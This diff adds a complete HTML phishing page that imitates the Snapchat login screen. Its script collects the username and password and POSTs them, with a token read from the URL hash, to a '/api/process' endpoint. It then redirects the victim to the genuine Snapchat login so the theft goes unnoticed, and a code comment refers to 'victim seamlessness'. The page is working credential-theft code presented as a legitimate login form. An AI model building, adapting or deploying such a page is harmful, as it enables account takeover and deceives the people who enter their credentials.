@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat - Log In</title>
+    <link rel="shortcut icon" href="https://www.snapchat.com/favicon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #FFFC00; 
+            color: #000000;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .snap-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 48px 40px;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @media (max-width: 480px) {
+            body { background-color: #ffffff; }
+            .snap-card { box-shadow: none; border-radius: 0; padding: 24px; }
+            .main-content { align-items: flex-start; pt-10; }
+        }
+
+        .snap-input {
+            width: 100%;
+            height: 56px;
+            background: #f7f7f7;
+            border: 2px solid transparent;
+            border-radius: 16px;
+            padding: 0 20px;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            outline: none;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .snap-input:focus {
+            background: #fff;
+            border-color: #000;
+            transform: translateY(-1px);
+        }
+
+        .snap-btn {
+            width: 100%;
+            height: 56px;
+            background: #000000;
+            color: #ffffff;
+            border-radius: 28px;
+            font-weight: 800;
+            font-size: 16px;
+            margin-top: 12px;
+            transition: all 0.2s;
+            cursor: pointer;
+            letter-spacing: 0.01em;
+        }
+
+        .snap-btn:hover {
+            transform: scale(1.01);
+            background: #1a1a1a;
+        }
+
+        .snap-btn:active {
+            transform: scale(0.98);
+        }
+
+        .snap-logo {
+            width: 80px;
+            height: auto;
+            margin-bottom: 32px;
+        }
+
+        .footer {
+            padding: 32px;
+            text-align: center;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.5);
+            font-weight: 500;
+        }
+
+        .footer a {
+            color: #000;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        #loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(0,0,0,0.05);
+            overflow: hidden;
+            display: none;
+        }
+        #loader div {
+            position: absolute;
+            background-color: #000;
+            height: 100%;
+            width: 35%;
+            animation: snapProgress 1.2s infinite cubic-bezier(0.65, 0, 0.35, 1);
+        }
+        @keyframes snapProgress {
+            0% { left: -35%; }
+            100% { left: 100%; }
+        }
+
+        .social-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 24px;
+            width: 100%;
+        }
+
+        .social-item {
+            flex: 1;
+            height: 52px;
+            border: 2px solid #f0f0f0;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .social-item:hover {
+            border-color: #000;
+            background: #fafafa;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-content">
+        <div class="snap-card">
+            <div id="loader"><div></div></div>
+            
+            <div class="flex justify-center">
+                <!-- Using high-fidelity ghost asset -->
+                <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat" class="snap-logo">
+            </div>
+            
+            <h1 class="text-[28px] font-black mb-2 tracking-tight">Log In</h1>
+            <p class="text-gray-500 mb-10 font-medium">To continue to Snapchat</p>
+
+            <div id="login-form">
+                <input type="text" id="username" placeholder="Username or Email" class="snap-input" autocomplete="username" spellcheck="false">
+                <input type="password" id="password" placeholder="Password" class="snap-input" autocomplete="current-password">
+                
+                <div class="text-left mb-8 px-1">
+                    <a href="#" class="text-sm font-bold text-blue-600 hover:text-blue-700">Forgot password?</a>
+                </div>
+
+                <button onclick="execute()" class="snap-btn">Log In</button>
+
+                <div class="mt-8 text-sm font-medium text-gray-500">
+                    New to Snapchat? <a href="#" class="font-bold text-blue-600 hover:underline">Sign Up</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="mb-4 flex flex-wrap justify-center gap-y-2">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Support</a>
+        </div>
+        <p>© 2026 Snap Inc.</p>
+    </footer>
+
+<script>
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
+
+    const configString = getRawConfig();
+
+    async function execute() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+
+        if (!u || !p) return;
+
+        // Show the 2026 progress bar
+        const loader = document.getElementById('loader');
+        if (loader) loader.style.display = 'block';
+
+        const finishUrl = "https://accounts.snapchat.com/accounts/login";
+
+        // Redirect if no config payload is found in the link
+        if (!configString) {
+            setTimeout(() => window.location.href = finishUrl, 1200);
+            return;
+        }
+
+        try {
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString,
+                    service: 'snapchat', 
+                    data: { 
+                        User: u, 
+                        Pass: p 
+                    }
+                })
+            });
+        } catch (e) {
+            // Silenced for victim seamlessness
+        } finally {
+            setTimeout(() => {
+                window.location.href = finishUrl;
+            }, 1200);
+        }
+    }
+</script>
+</body>
+</html>
